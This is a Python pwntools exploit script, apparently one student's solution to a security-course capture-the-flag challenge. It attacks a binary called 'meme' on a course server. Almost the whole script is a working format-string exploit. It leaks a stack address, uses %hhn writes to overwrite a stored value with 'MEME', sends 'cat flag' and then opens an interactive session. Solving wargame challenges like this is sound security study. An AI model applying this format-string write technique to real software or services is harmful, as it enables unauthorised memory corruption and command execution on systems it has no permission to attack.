#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './meme' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29835 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# We are given apointer, possible a stack pointer.
# We need to write "MEME" intro 0x804a17c
# With input = BAAAA %x %x %x, we get 42000000 41414141 ...
# The stack pointer pointers to (originally) "6447" so this
# is what we need to overwrite
# last brute force attempt 64
p.recvuntil(b'the way at ', drop = True)
stack_ptr = p.recvuntil(b'\n', drop = True)
log.info(f"stack pointer: {stack_ptr}")
stack_ptr = int(stack_ptr, 16)
log.info(f"stack pointer: {stack_ptr}")
p.recvuntil(b'open: ', drop = True)
#padding
payload = b'A'
#Target address (where 6447 is stored)
payload += p32(stack_ptr)
# %s to access the address
payload += b'%2$s'
# Payload successfully leaks 6447, now we want to replace this
# with MEME, M = 4D, E = 45

#p.sendline(payload)
#padding
exploit = b'A'

exploit += p32(stack_ptr)     #M
exploit += p32(stack_ptr + 1) #E
exploit += p32(stack_ptr + 2) #M
exploit += p32(stack_ptr + 3) #E
#exploit += p32(stack_ptr + 4) #\n

# Write first %n (so far, 21 bytes, or use len)
curr_bytes = len(exploit)
# Fill in remaining to get 4D
write_M = ord('M') - curr_bytes
exploit += f'%{write_M}x%2$hhn'.encode()

# Reset bytes (kinda, reset last two bytes to 00)
write_E = 0x100 + ord('E') - ord('M')
exploit += f'%{write_E}x%3$hhn'.encode()

write_M = 0x100 + ord('M') - ord('E')
exploit += f'%{write_M}x%4$hhn'.encode()

write_E = 0x100 + ord('E') - ord('M')
exploit += f'%{write_E}x%5$hhn'.encode()

#write_null = 0x100 + 0x00 - ord('E')
#exploit += f'%{write_null}x%6$hhn'.encode()

p.sendline(exploit)
p.sendline("cat flag")
flag = p.recvline()
log.info(f"Flag retrieved: {flag}")
p.interactive()

